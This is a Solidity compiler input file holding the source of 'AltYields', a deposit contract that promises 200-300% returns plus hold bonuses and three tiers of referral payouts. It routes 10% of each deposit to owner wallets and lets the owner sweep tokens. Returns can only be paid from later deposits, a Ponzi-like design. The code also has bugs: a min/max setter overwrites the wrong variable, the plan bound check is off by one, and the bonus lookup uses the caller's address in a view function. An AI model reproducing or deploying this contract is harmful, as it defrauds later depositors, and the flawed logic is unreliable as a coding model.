{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "AltYields.sol": {
      "content": "pragma solidity 0.5.10;\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract AltYields {\r\n\tusing SafeMath for uint256;\r\n\r\n\tuint256[] public REFERRAL_PERCENTS = [50, 40, 30];\r\n\tuint256[] public BONUS_PERCENTS = [100, 150, 200, 250, 300];\r\n\tuint256 constant public TOTAL_REF = 120;\r\n\tuint256 constant public PROJECT_FEE = 90;\r\n\tuint256 constant public DEV_FEE = 10;\r\n\tuint256 constant public HOLD_BONUS = 10;\r\n\tuint256 constant public PERCENTS_DIVIDER = 1000;\r\n\tuint256 constant public TIME_STEP = 1 days;\r\n\r\n\tuint256 public totalInvested;\r\n\tuint256 public totalBonus;\r\n\r\n\tuint256 public INVEST_MIN_AMOUNT = 0.25 ether;\r\n\tuint256 public INVEST_MAX_AMOUNT = 25 ether;\r\n\tuint256 public BONUS_MIN_AMOUNT = 0.25 ether;\r\n\tuint256 public BONUS_MAX_AMOUNT = 25 ether;\r\n\r\n\r\n\r\n\tbool public bonusStatus = false;\r\n\r\n    struct Plan {\r\n        uint256 time;\r\n        uint256 percent;\r\n    }\r\n\r\n    Plan[] internal plans;\r\n\r\n\tstruct Deposit {\r\n        uint8 plan;\r\n\t\tuint256 amount;\r\n\t\tuint256 start;\r\n\t}\r\n\r\n\tstruct User {\r\n\t\tDeposit[] deposits;\r\n\t\tuint256 checkpoint;\r\n\t\taddress referrer;\r\n\t\tuint256[3] levels;\r\n\t\tuint256 bonus;\r\n\t\tuint256 totalBonus;\r\n\t\tuint256 withdrawn;\r\n\t}\r\n\r\n\tmapping (address => User) internal users;\r\n\tmapping (address => mapping(uint256 => uint256)) internal userDepositBonus;\r\n\r\n\tuint256 public startDate;\r\n\r\n\taddress payable public ceoWallet;\r\n\taddress payable public devWallet;\r\n\r\n\tevent Newbie(address user);\r\n\tevent NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);\r\n\tevent Withdrawn(address indexed user, uint256 amount);\r\n\tevent RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);\r\n\tevent FeePayed(address indexed user, uint256 totalAmount);\r\n\r\n\tconstructor(address payable ceoAddr, address payable devAddr, uint256 start) public {\r\n\t\trequire(!isContract(ceoAddr) && !isContract(devAddr));\r\n\t\tceoWallet = ceoAddr;\r\n\t\tdevWallet = devAddr;\r\n\r\n\t\tif(start>0){\r\n\t\t\tstartDate = start;\r\n\t\t}\r\n\t\telse{\r\n\t\t\tstartDate = block.timestamp;\r\n\t\t}\r\n\r\n        plans.push(Plan(40,  50));  // 200%\r\n        plans.push(Plan(60,  40));  // 240%\r\n        plans.push(Plan(100, 30));  // 300%\r\n\t}\r\n\r\n\tfunction invest(address referrer, uint8 plan) public payable {\r\n\t\trequire(block.timestamp > startDate, \"contract does not launch yet\");\r\n\t\trequire(msg.value >= INVEST_MIN_AMOUNT,\"error min\");\r\n\t\trequire(msg.value <= INVEST_MAX_AMOUNT,\"error max\");\r\n        require(plan < 4, \"Invalid plan\");\r\n\r\n\t\tuint256 pFee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\r\n\t\tuint256 dFee = msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER);\r\n\t\tceoWallet.transfer(pFee);\r\n\t\tdevWallet.transfer(dFee);\r\n\t\temit FeePayed(msg.sender, pFee.add(dFee));\r\n\r\n\t\tUser storage user = users[msg.sender];\r\n\r\n\t\tif (user.referrer == address(0)) {\r\n\t\t\tif (users[referrer].deposits.length > 0 && referrer != msg.sender) {\r\n\t\t\t\tuser.referrer = referrer;\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tuser.referrer = ceoWallet;\r\n\t\t\t}\r\n\r\n\t\t\taddress upline = user.referrer;\r\n\t\t\tfor (uint256 i = 0; i < 3; i++) {\r\n\t\t\t\tif (upline != address(0)) {\r\n\t\t\t\t\tusers[upline].levels[i] = users[upline].levels[i].add(1);\r\n\t\t\t\t\tupline = users[upline].referrer;\r\n\t\t\t\t} else break;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (user.referrer != address(0)) {\r\n\t\t\taddress upline = user.referrer;\r\n\t\t\tfor (uint256 i = 0; i < 3; i++) {\r\n\t\t\t\tif (upline != address(0)) {\r\n\t\t\t\t\tuint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);\r\n\t\t\t\t\tusers[upline].bonus = users[upline].bonus.add(amount);\r\n\t\t\t\t\tusers[upline].totalBonus = users[upline].totalBonus.add(amount);\r\n\t\t\t\t\temit RefBonus(upline, msg.sender, i, amount);\r\n\t\t\t\t\tupline = users[upline].referrer;\r\n\t\t\t\t} else break;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (user.deposits.length == 0) {\r\n\t\t\tuser.checkpoint = block.timestamp;\r\n\t\t\temit Newbie(msg.sender);\r\n\t\t}\r\n\t\tuser.deposits.push(Deposit(plan, msg.value, block.timestamp));\r\n\t\ttotalInvested = totalInvested.add(msg.value);\r\n\t\temit NewDeposit(msg.sender, plan, msg.value, block.timestamp);\r\n\r\n\r\n\t\t//bonus\r\n\t\tif(bonusStatus){\r\n\t\t\tif(user.deposits.length >= 2 && user.deposits.length <=5){\r\n\t\t\t\tuint256 firstAmount = user.deposits[0].amount;\r\n\t\t\t\tif(firstAmount >= BONUS_MIN_AMOUNT && firstAmount <= BONUS_MAX_AMOUNT){\r\n\t\t\t\t\tuint256 preAmount = user.deposits[user.deposits.length -2].amount;\r\n\t\t\t\t\tif(user.deposits.length == 2){\r\n\t\t\t\t\t\tif(preAmount == msg.value){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[0];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse if( msg.value > preAmount && msg.value <= BONUS_MAX_AMOUNT){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[1];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(user.deposits.length == 3){\r\n\t\t\t\t\t\tif(preAmount == msg.value){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[0];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse if( msg.value > preAmount && msg.value <= BONUS_MAX_AMOUNT){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[2];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(user.deposits.length == 4){\r\n\t\t\t\t\t\tif(preAmount == msg.value){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[0];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse if( msg.value > preAmount && msg.value <= BONUS_MAX_AMOUNT){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[3];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(user.deposits.length == 5){\r\n\t\t\t\t\t\tif(preAmount == msg.value){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[0];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse if( msg.value > preAmount && msg.value <= BONUS_MAX_AMOUNT){\r\n\t\t\t\t\t\t\tuserDepositBonus[msg.sender][user.deposits.length-1] = BONUS_PERCENTS[4];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\r\n\r\n\t\t\t\t\ttotalBonus = totalBonus.add(userDepositBonus[msg.sender][user.deposits.length-1].mul(msg.value).div(PERCENTS_DIVIDER));\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\r\n\t}\r\n\r\n\tfunction withdraw() public {\r\n\t\tUser storage user = users[msg.sender];\r\n\r\n\t\tuint256 totalAmount = getUserDividends(msg.sender);\r\n\r\n\t\tuint256 referralBonus = getUserReferralBonus(msg.sender);\r\n\t\tif (referralBonus > 0) {\r\n\t\t\tuser.bonus = 0;\r\n\t\t\ttotalAmount = totalAmount.add(referralBonus);\r\n\t\t}\r\n\r\n\t\trequire(totalAmount > 0, \"User has no dividends\");\r\n\r\n\t\tuint256 contractBalance = address(this).balance;\r\n\t\tif (contractBalance < totalAmount) {\r\n\t\t\tuser.bonus = totalAmount.sub(contractBalance);\r\n\t\t\ttotalAmount = contractBalance;\r\n\t\t}\r\n\r\n\t\tuser.checkpoint = block.timestamp;\r\n\t\tuser.withdrawn = user.withdrawn.add(totalAmount);\r\n\r\n\t\tmsg.sender.transfer(totalAmount);\r\n\r\n\t\temit Withdrawn(msg.sender, totalAmount);\r\n\t}\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t}\r\n\r\n\tfunction getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {\r\n\t\ttime = plans[plan].time;\r\n\t\tpercent = plans[plan].percent;\r\n\t}\r\n\r\n\tfunction getUserDividends(address userAddress) public view returns (uint256) {\r\n\t\tUser storage user = users[userAddress];\r\n\r\n\t\tuint256 totalAmount;\r\n\r\n\t\tfor (uint256 i = 0; i < user.deposits.length; i++) {\r\n\t\t\tuint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));\r\n\t\t\tif (user.checkpoint < finish) {\r\n\t\t\t\tuint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);\r\n\t\t\t\tuint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;\r\n\t\t\t\tuint256 to = finish < block.timestamp ? finish : block.timestamp;\r\n\t\t\t\tif (from < to) {\r\n\t\t\t\t\ttotalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));\r\n\t\t\t\t\t\r\n\t\t\t\t\tuint256 holdDays = (to.sub(from)).div(TIME_STEP);\r\n\t\t\t\t\tif(holdDays > 0){\r\n\t\t\t\t\t\ttotalAmount = totalAmount.add(user.deposits[i].amount.mul(HOLD_BONUS.mul(holdDays)).div(PERCENTS_DIVIDER));\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\t//end of plan\r\n\t\t\t\tif(finish <= block.timestamp){\r\n\t\t\t\t\tif(userDepositBonus[msg.sender][i] > 0){\r\n\t\t\t\t\t\ttotalAmount = totalAmount.add(user.deposits[i].amount.mul(userDepositBonus[msg.sender][i]).div(PERCENTS_DIVIDER));\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn totalAmount;\r\n\t}\r\n\r\n\tfunction getUserHoldBonus(address userAddress) public view returns (uint256) {\r\n\t\tUser storage user = users[userAddress];\r\n\t\tif(user.checkpoint > 0){\r\n\t\t\tuint256 holdBonus = 0;\r\n\t\t\t\tif (user.checkpoint < block.timestamp) {\r\n\t\t\t\t\tuint256 holdDays = (block.timestamp.sub(user.checkpoint)).div(TIME_STEP);\r\n\t\t\t\t\tif(holdDays > 0){\r\n\t\t\t\t\t\tholdBonus = holdDays.mul(HOLD_BONUS);\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\treturn holdBonus;\r\n\t\t}\r\n\t\telse{\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t}\r\n\r\n\tfunction getUserTotalWithdrawn(address userAddress) public view returns (uint256) {\r\n\t\treturn users[userAddress].withdrawn;\r\n\t}\r\n\r\n\tfunction getUserCheckpoint(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].checkpoint;\r\n\t}\r\n\r\n\tfunction getUserReferrer(address userAddress) public view returns(address) {\r\n\t\treturn users[userAddress].referrer;\r\n\t}\r\n\r\n\tfunction getUserDownlineCount(address userAddress) public view returns(uint256[3] memory referrals) {\r\n\t\treturn (users[userAddress].levels);\r\n\t}\r\n\r\n\tfunction getUserTotalReferrals(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2];\r\n\t}\r\n\r\n\tfunction getUserReferralBonus(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].bonus;\r\n\t}\r\n\r\n\tfunction getUserReferralTotalBonus(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].totalBonus;\r\n\t}\r\n\r\n\tfunction getUserReferralWithdrawn(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].totalBonus.sub(users[userAddress].bonus);\r\n\t}\r\n\r\n\tfunction getUserAvailable(address userAddress) public view returns(uint256) {\r\n\t\treturn getUserReferralBonus(userAddress).add(getUserDividends(userAddress));\r\n\t}\r\n\r\n\tfunction getUserAmountOfDeposits(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].deposits.length;\r\n\t}\r\n\r\n\tfunction getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {\r\n\t\tfor (uint256 i = 0; i < users[userAddress].deposits.length; i++) {\r\n\t\t\tamount = amount.add(users[userAddress].deposits[i].amount);\r\n\t\t}\r\n\t}\r\n\r\n\tfunction getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {\r\n\t    User storage user = users[userAddress];\r\n\r\n\t\tplan = user.deposits[index].plan;\r\n\t\tpercent = plans[plan].percent;\r\n\t\tamount = user.deposits[index].amount;\r\n\t\tstart = user.deposits[index].start;\r\n\t\tfinish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));\r\n\t}\r\n\r\n\tfunction getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalRef, uint256 _totalBonus) {\r\n\t\treturn(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER),totalBonus);\r\n\t}\r\n\r\n\tfunction getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {\r\n\t\treturn(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));\r\n\t}\r\n\r\n\tfunction isContract(address addr) internal view returns (bool) {\r\n        uint size;\r\n        assembly { size := extcodesize(addr) }\r\n        return size > 0;\r\n    }\r\n\r\n\t//config\r\n\tfunction setMinMax(uint256 minAmount, uint256 maxAmount,uint256 minBonus, uint256 maxBonus) external {\r\n\t\trequire(msg.sender == ceoWallet, \"only owner\");\r\n\t\tINVEST_MIN_AMOUNT = minAmount;\r\n\t\tINVEST_MIN_AMOUNT = maxAmount;\r\n\t\tBONUS_MIN_AMOUNT  = minBonus;\r\n\t\tBONUS_MAX_AMOUNT  = maxBonus;\r\n\t}\r\n\r\n\tfunction setBonusStatus(bool status) external {\r\n\t\trequire(msg.sender == ceoWallet, \"only owner\");\r\n\t\tbonusStatus = status;\r\n\t}\r\n\r\n\tfunction withdrawTokens(address tokenAddr, address to) external {\r\n\t\trequire(msg.sender == ceoWallet, \"only owner\");\r\n\t\tIERC20 token = IERC20(tokenAddr);\r\n\t\ttoken.transfer(to,token.balanceOf(address(this)));\r\n\t}\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}"
    }
  }
}